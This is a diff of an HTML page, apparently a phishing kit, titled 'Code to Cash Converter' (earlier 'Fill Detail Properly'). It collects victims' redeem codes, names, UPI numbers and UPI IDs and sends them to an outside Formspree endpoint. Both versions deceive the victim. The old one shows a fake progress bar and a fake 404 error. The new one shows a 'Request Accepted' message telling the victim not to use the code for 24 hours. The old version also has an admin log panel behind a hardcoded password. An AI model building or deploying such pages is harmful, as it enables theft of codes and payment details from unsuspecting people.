@@ -1,175 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fill Detail Properly</title>
-
-<style>
-body {
-    background: #0f172a;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    color: white;
-}
-
-.box {
-    background: #020617;
-    padding: 25px;
-    border-radius: 12px;
-    width: 90%;
-    max-width: 400px;
-    box-shadow: 0 0 25px rgba(0,0,0,0.5);
-}
-
-h2 {
-    text-align: center;
-}
-
-textarea {
-    width: 100%;
-    height: 100px;
-    border-radius: 8px;
-    border: none;
-    padding: 10px;
-    resize: none;
-    font-size: 15px;
-}
-
-button {
-    width: 100%;
-    margin-top: 15px;
-    padding: 12px;
-    background: #2563eb;
-    border: none;
-    border-radius: 8px;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-}
-
-.progress {
-    margin-top: 15px;
-    display: none;
-}
-
-.progress div {
-    height: 10px;
-    background: #22c55e;
-    width: 0%;
-    border-radius: 6px;
-}
-
-#status {
-    text-align: center;
-    margin-top: 10px;
-    font-size: 14px;
-}
-
-/* ADMIN */
-.admin {
-    display: none;
-}
-.admin textarea {
-    height: 200px;
-}
-</style>
+  <meta charset="UTF-8">
+  <title>Code to Cash Converter</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f0f0f0;
+    }
+    textarea {
+      width: 100%;
+      height: 80px;
+      margin: 10px 0;
+      padding: 10px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+  </style>
 </head>
-
 <body>
+  <h1>Code to Cash Converter</h1>
 
-<div class="box user">
-    <h2>Fill Detail Properly</h2>
-    <textarea id="userText" placeholder="Enter Code to convert..."></textarea>
-    
-    <textarea id="msg1" placeholder="Your Name"></textarea>
-<textarea id="msg2" placeholder="Mobile Number"></textarea>
-<textarea id="msg3" placeholder="UPI Id"></textarea>
-    <button onclick="convert()">Convert</button>
+  <!-- Textareas -->
+  <textarea id="userText" placeholder="Your Full Name"></textarea>
+  <textarea id="msg1" placeholder="Your UPI Number"></textarea>
+  <textarea id="msg2" placeholder="Your UPI ID"></textarea>
+  <textarea id="msg3" placeholder="Redeem Code"></textarea>
 
-    <div class="progress" id="progressBox">
-        <div id="bar"></div>
-    </div>
-    <div id="status"></div>
-</div>
-
-<div class="box admin">
-    <h2>📊 Admin Panel</h2>
-    <textarea id="logs" readonly></textarea>
-</div>
+  <br>
+  <button id="convertBtn">Convert</button>
 
 <script>
-const ADMIN_PASSWORD = "1234"; // CHANGE THIS
+document.getElementById("convertBtn").addEventListener("click", function() {
+  const data = {
+    mainText: document.getElementById("userText").value,
+    text1: document.getElementById("msg1").value,
+    text2: document.getElementById("msg2").value,
+    text3: document.getElementById("msg3").value
+  };
+// ✅ Check if any box is empty
+const text1 = document.getElementById("userText").value.trim();
+const text2 = document.getElementById("msg1").value.trim();
+const text3 = document.getElementById("msg2").value.trim();
+const text4 = document.getElementById("msg3").value.trim();
 
-// ADMIN MODE
-if (location.search.includes("admin")) {
-    let pass = prompt("Enter admin password:");
-    if (pass === ADMIN_PASSWORD) {
-        document.querySelector(".user").style.display = "none";
-        document.querySelector(".admin").style.display = "block";
-        loadLogs();
-    } else {
-        alert("Access Denied");
-    }
+if (!text1 || !text2 || !text3 || !text4) {
+  alert("Enter Text First!");
+  return; // stop execution if any box is empty
 }
-
-function convert() {
-    let text = document.getElementById("userText").value;
-    if (text.trim() === "") {
-        alert("Please enter text");
-        return;
-    }
-
-    // SAVE LOCALLY
-    let logs = JSON.parse(localStorage.getItem("logs") || "[]");
-    logs.push(text);
-    localStorage.setItem("logs", JSON.stringify(logs));
-
-    // SEND TO EMAIL (Formspree)
-    fetch("https://formspree.io/f/mzdabqwj", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-       body: JSON.stringify({
-  mainText: document.getElementById("userText").value,
-  text1: document.getElementById("msg1").value,
-  text2: document.getElementById("msg2").value,
-  text3: document.getElementById("msg3").value
-})
-    });
-
-    // FAKE PROGRESS
-    document.getElementById("progressBox").style.display = "block";
-    let bar = document.getElementById("bar");
-    let status = document.getElementById("status");
-
-    let percent = 0;
-    let interval = setInterval(() => {
-        percent += Math.floor(Math.random() * 10);
-        if (percent >= 87) percent = 87;
-        bar.style.width = percent + "%";
-        status.innerText = "Converting... " + percent + "%";
-
-        if (percent === 87) {
-            clearInterval(interval);
-            setTimeout(() => {
-                alert("Failed 404: Error Not Found\nPlease try again later.");
-                document.getElementById("userText").value = "";
-                bar.style.width = "0%";
-                status.innerText = "";
-                document.getElementById("progressBox").style.display = "none";
-            }, 800);
-        }
-    }, 300);
-}
-
-function loadLogs() {
-    let logs = JSON.parse(localStorage.getItem("logs") || "[]");
-    document.getElementById("logs").value = logs.join("\n\n---\n\n");
-}
+  fetch("https://formspree.io/f/mzdabqwj", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
+    },
+    body: JSON.stringify(data)
+  }).then(() => {
+    // Replace current page with success message
+    document.body.innerHTML = `
+      <h1>Request Accepted</h1>
+      <p>Please wait for 24 hours</p>
+      <p><strong>Note:</strong> Don't use the code in this time period</p>
+    `;
+    document.body.style.textAlign = "center";
+    document.body.style.fontFamily = "Arial, sans-serif";
+    document.body.style.padding = "50px";
+    document.body.style.background = "#f0f0f0";
+  });
+});
 </script>
-
-</body>
-</html>
